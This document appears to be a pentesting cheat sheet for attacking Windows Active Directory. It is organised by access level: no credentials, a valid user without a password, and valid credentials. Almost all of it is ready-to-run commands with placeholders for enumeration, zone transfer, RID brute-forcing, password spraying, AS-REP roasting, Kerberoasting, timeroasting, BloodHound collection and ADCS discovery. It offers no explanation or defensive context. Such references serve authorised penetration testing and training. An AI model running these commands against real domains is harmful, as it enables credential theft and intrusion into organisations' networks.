---
icon: windows
---

# Active Directory

## No credentials

### Enumeration

```sh
netexec smb <target>
enum4linux -a <target>
nmap -n -sV --script "ldap* and not brute" -p 389 <dc_ip>
ldapsearch -x -H <dc_ip> -s base
```

### Zone transfer

{% code overflow="wrap" %}
```sh
dig axfr <domain> @<dc_ip>
```
{% endcode %}

### Shares

```bash
netexec smb <IP> -u '' -p '' --shares
netexec smb <IP> -u 'guest' -p '' --shares
```

### Enumerate users

{% code overflow="wrap" %}
```sh
nxc smb <dc_ip> --users
nxc smb <dc_ip> --rid-brute 10000
```
{% endcode %}

```bash
kerbrute userenum -d <domain> <users.txt>
```

### Timeroast

{% code overflow="wrap" %}
```sh
timeroast.py <dc_ip>
```
{% endcode %}

## Valid user (no password)

### Password spray

{% code overflow="wrap" %}
```sh
nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success
```
{% endcode %}

### ASREProast <a href="#asreproast" id="asreproast"></a>

{% code overflow="wrap" %}
```sh
nxc ldap <dc_ip> -u <users.txt> -p '' --asreproast <output.txt>
```
{% endcode %}

{% code overflow="wrap" %}
```bash
GetNPUsers.py <domain>/ -usersfile <users.txt>
```
{% endcode %}

### Blind Kerberoast

{% code overflow="wrap" %}
```sh
GetUserSPNs.py -no-preauth '<asrep_user>' -usersfile <users.txt> -dc-host <dc_ip> <domain>/
```
{% endcode %}

## Valid credentials

### List all users

{% code overflow="wrap" %}
```sh
nxc smb <dc_ip> -u '<user>' -p '<password>' --users
```
{% endcode %}

### Enumerate SMB shares

{% code overflow="wrap" %}
```sh
nxc smb <dc_ip> -u '<user>' -p '<password>' -M spider_plus
```
{% endcode %}

{% code overflow="wrap" %}
```sh
smbclient.py '<user>:<passwod>@<dc_ip>'
```
{% endcode %}

### BloodHound

{% code overflow="wrap" %}
```sh
bloodhound-ce-python -d '<domain>' -u '<user>' -p '<password>' [-ns '<dc_ip>'] -c All --zip
```
{% endcode %}

### Enumerate LDAP

{% code overflow="wrap" %}
```sh
ldapdomaindump.py -u '<domain>\<user>' -p '<password>' -o <output_folder> '<dc_ip>'
```
{% endcode %}

### Enumerate ADCS

{% code overflow="wrap" %}
```sh
certipy find -u '<user>@<domain>' -p '<password>' -dc-ip '<dc_ip>' -stdout
```
{% endcode %}

### Kerberoast

{% code overflow="wrap" %}
```bash
nxc ldap <dc_ip> -u '<user>' -p '<password>' --kerberoasting <output.txt>
```
{% endcode %}

{% code overflow="wrap" %}
```sh
GetUserSPNs.py -request [-dc-ip <dc_ip>] '<domain>/<user>:<password>'
```
{% endcode %}

{% hint style="danger" %}
If you find this error from Linux: `KRB_AP_ERR_SKEW(Clock skew too great)` it's because of your local time, you need to synchronise the host with the DC.

{% code overflow="wrap" fullWidth="false" %}
```bash
sudo ntpdate <target>
```
{% endcode %}
{% endhint %}

